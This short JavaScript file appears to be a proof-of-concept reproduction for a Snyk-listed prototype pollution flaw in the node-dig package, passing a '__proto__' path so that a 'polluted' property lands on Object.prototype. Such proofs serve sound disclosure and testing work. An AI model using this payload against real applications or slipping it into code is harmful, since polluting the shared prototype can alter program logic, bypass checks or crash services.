//https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
 
  const nodeDig = require("node-dig");
   

  nodeDig({}, ["__proto__", "polluted"], "yes");
// End of file
